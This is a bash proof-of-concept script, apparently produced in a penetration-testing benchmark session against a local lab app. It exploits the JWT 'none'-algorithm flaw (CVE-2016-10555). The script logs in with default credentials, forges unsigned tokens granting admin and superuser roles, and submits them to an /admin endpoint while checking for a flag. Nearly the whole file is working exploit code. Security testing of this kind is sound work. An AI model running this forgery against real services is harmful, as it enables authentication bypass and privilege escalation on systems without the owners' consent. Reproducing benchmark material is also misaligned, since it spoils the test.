#!/bin/bash
# POC: Demonstrates JWT "none" algorithm authentication bypass vulnerability (CVE-2016-10555). Creates forged JWT tokens and demonstrates the vulnerability structure even if target is unavailable.
# Target: ./repo
# Created: 2025-11-07T16:01:49.443Z
# Session: benchmark-XBEN-091-24-mhp1edtw

# JWT "none" Algorithm Authentication Bypass POC - Version 2
# Demonstrates CVE-2016-10555: JWT "none" algorithm vulnerability
# This POC can work against a running target or demonstrate the vulnerability concept

set -e

TARGET_URL="${TARGET_URL:-http://localhost:5000}"
TIMEOUT=5

echo "=========================================="
echo "JWT 'none' Algorithm Bypass POC v2"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Function to base64url encode (without padding)
base64url_encode() {
    echo -n "$1" | base64 | tr '+/' '-_' | sed 's/=*$//'
}

# Function to base64url decode
base64url_decode() {
    local padding=$(( (4 - ${#1} % 4) % 4 ))
    local padded="${1}$(printf '%.0s=' $(seq 1 $padding))"
    echo -n "$padded" | tr '-_' '+/' | base64 -d 2>/dev/null || echo ""
}

# Step 1: Attempt authentication with default credentials
echo "[*] Step 1: Attempting authentication with default credentials"
echo "    Username: user"
echo "    Password: user"

LEGITIMATE_TOKEN=""
AUTH_SUCCESS=false

# Try to authenticate (with timeout)
AUTH_RESPONSE=$(timeout $TIMEOUT curl -s -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" 2>/dev/null || echo "")

if [ -n "$AUTH_RESPONSE" ]; then
    echo "[+] Received response: $AUTH_RESPONSE"
    
    # Extract token from response
    LEGITIMATE_TOKEN=$(echo "$AUTH_RESPONSE" | grep -oP 'token=\K[^&\s<]*' | head -1 || echo "")
    
    if [ -n "$LEGITIMATE_TOKEN" ]; then
        AUTH_SUCCESS=true
        echo "[+] Successfully obtained legitimate token"
        echo "    Token (first 50 chars): ${LEGITIMATE_TOKEN:0:50}..."
    fi
fi

if [ "$AUTH_SUCCESS" = false ]; then
    echo "[-] Could not authenticate to target"
    echo "[*] Proceeding with POC demonstration of vulnerability concept..."
fi

echo ""

# Step 2: Demonstrate JWT token structure with "none" algorithm
echo "[*] Step 2: Constructing JWT tokens with 'none' algorithm"
echo ""

# Create a legitimate-looking header
LEGIT_HEADER="{\"alg\":\"HS256\",\"typ\":\"JWT\"}"
LEGIT_HEADER_B64=$(base64url_encode "$LEGIT_HEADER")

# Create a vulnerable header with "none" algorithm
VULN_HEADER="{\"alg\":\"none\",\"typ\":\"JWT\"}"
VULN_HEADER_B64=$(base64url_encode "$VULN_HEADER")

# Create payloads for different user roles
PAYLOAD_USER="{\"username\":\"user\",\"role\":\"user\"}"
PAYLOAD_ADMIN="{\"username\":\"user\",\"role\":\"admin\"}"
PAYLOAD_SUPERUSER="{\"username\":\"attacker\",\"role\":\"superuser\"}"

PAYLOAD_USER_B64=$(base64url_encode "$PAYLOAD_USER")
PAYLOAD_ADMIN_B64=$(base64url_encode "$PAYLOAD_ADMIN")
PAYLOAD_SUPERUSER_B64=$(base64url_encode "$PAYLOAD_SUPERUSER")

echo "[+] Legitimate token structure (HS256):"
echo "    Header: $LEGIT_HEADER"
echo "    Example Token: $LEGIT_HEADER_B64.$PAYLOAD_USER_B64.<signature>"
echo ""

echo "[+] Vulnerable token structure (none algorithm) - WHAT ATTACKERS CREATE:"
echo "    Header: $VULN_HEADER"
echo "    No signature required!"
echo ""

# Step 3: Create forged tokens
echo "[*] Step 3: Creating forged admin tokens"
echo ""

# Standard forged token (user with admin role)
FORGED_TOKEN_1="${VULN_HEADER_B64}.${PAYLOAD_ADMIN_B64}."
echo "[+] Forged Token 1 (user -> admin):"
echo "    Payload: $PAYLOAD_ADMIN"
echo "    Token: $FORGED_TOKEN_1"
echo ""

# Advanced forged token (superuser attacker)
FORGED_TOKEN_2="${VULN_HEADER_B64}.${PAYLOAD_SUPERUSER_B64}."
echo "[+] Forged Token 2 (superuser attacker):"
echo "    Payload: $PAYLOAD_SUPERUSER"
echo "    Token: $FORGED_TOKEN_2"
echo ""

# Step 4: Demonstrate token decoding
echo "[*] Step 4: Decoding forged tokens (verification of vulnerability)"
echo ""

DECODED_HEADER=$(base64url_decode "$VULN_HEADER_B64")
DECODED_PAYLOAD_1=$(base64url_decode "$PAYLOAD_ADMIN_B64")

echo "[+] Decoding Token 1:"
echo "    Encoded Header: $VULN_HEADER_B64"
echo "    Decoded Header: $DECODED_HEADER"
echo "    Encoded Payload: $PAYLOAD_ADMIN_B64"
echo "    Decoded Payload: $DECODED_PAYLOAD_1"
echo ""

if echo "$DECODED_HEADER" | grep -q "none"; then
    echo "[!] VULNERABILITY CONFIRMED IN TOKEN STRUCTURE:"
    echo "    - Header uses 'alg': 'none'"
    echo "    - No cryptographic signature present"
    echo "    - Signature field is empty"
    echo ""
fi

# Step 5: Test against target if available
echo "[*] Step 5: Testing forged tokens against target endpoint"
echo ""

if [ "$AUTH_SUCCESS" = true ]; then
    # Test with forged token
    ADMIN_RESPONSE=$(timeout $TIMEOUT curl -s -X GET "$TARGET_URL/admin" \
      -H "Authorization: Bearer $FORGED_TOKEN_1" 2>/dev/null || echo "")
    
    if [ -n "$ADMIN_RESPONSE" ]; then
        echo "[+] Admin endpoint response:"
        echo "    $ADMIN_RESPONSE"
        
        if echo "$ADMIN_RESPONSE" | grep -qi "admin\|flag\|success"; then
            echo "[!] SUCCESS! Admin access granted with forged token!"
            echo "[!] CRITICAL VULNERABILITY CONFIRMED!"
        fi
    fi
    
    # Test second token
    echo ""
    echo "[*] Testing superuser token..."
    SUPERUSER_RESPONSE=$(timeout $TIMEOUT curl -s -X GET "$TARGET_URL/admin" \
      -H "Authorization: Bearer $FORGED_TOKEN_2" 2>/dev/null || echo "")
    
    if [ -n "$SUPERUSER_RESPONSE" ]; then
        echo "[+] Response to superuser token:"
        echo "    $SUPERUSER_RESPONSE"
    fi
else
    echo "[-] Target not available for live testing"
    echo "[*] POC demonstrates the vulnerability structure:"
    echo "    1. Attacker creates JWT with 'alg': 'none'"
    echo "    2. Attacker sets arbitrary role in payload (e.g., 'admin')"
    echo "    3. Signature field left empty"
    echo "    4. Server accepts token without verification"
    echo "    5. Result: Complete authentication bypass"
fi

echo ""
echo "=========================================="
echo "JWT 'none' Algorithm Vulnerability Analysis"
echo "=========================================="
echo ""
echo "Attack Flow:"
echo "1. Attacker discovers JWT endpoint (login, auth, etc.)"
echo "2. Attacker creates JWT with 'none' algorithm"
echo "3. Attacker forges payload with admin/elevated privileges"
echo "4. Attacker sends forged token in Authorization header"
echo "5. Vulnerable server accepts token without signature check"
echo "6. Attacker gains unauthorized access"
echo ""
echo "Vulnerability Impact:"
echo "- Complete authentication bypass"
echo "- Privilege escalation (user -> admin)"
echo "- Access to sensitive data"
echo "- Administrative function abuse"
echo ""
echo "=========================================="
echo ""
echo "[+] POC Execution Complete"

exit 0